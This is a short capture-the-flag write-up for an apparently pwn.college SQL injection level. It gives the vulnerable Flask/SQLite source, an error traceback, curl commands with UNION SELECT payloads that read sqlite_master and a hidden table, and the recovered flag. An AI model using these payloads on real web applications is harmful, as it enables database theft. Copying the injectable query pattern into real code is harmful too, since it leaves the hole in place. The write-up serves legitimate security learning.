# Level 6

We are given with a takl of `Exploit a structured query language injection vulnerability with an unknown database structure`

We are given with machine and souce code of the machine

```python {3} /{query}/ copy

def level6():
    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)

```

It is same challenge as level 5 but here we have to find the table name which is created by the hash of the flag

when we pass the previous query we got errors

```bash /sqlite3/
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1484, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File "/challenge/run", line 670, in catch_all
    return challenge()
  File "/challenge/run", line 158, in level6
    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
  File "/challenge/run", line 39, in execute
    result = cursor.execute(sql, parameters)
sqlite3.OperationalError: no such table: users
```

Now we now its a sqlite database and we can use `sqlite_master` to get the table name

```bash /sqlite3/ copy
curl -X GET 'http://challenge.localhost/?query=flag" UNION SELECT tbl_name FROM sqlite_master-- -'
```

reponse is `table10623237887438613517`

Now we can use this table name to get the flag

```bash copy
curl -X GET 'http://challenge.localhost/?query=flag" UNION SELECT password FROM table10623237887438613517-- -'
```
That retrived the flag for us ðŸš© 
```bash copy
pwn.college{gfxwg_D78SD3e4-8ri7H45vME8Y.dJTOzMDL0IzMyMzW}
```
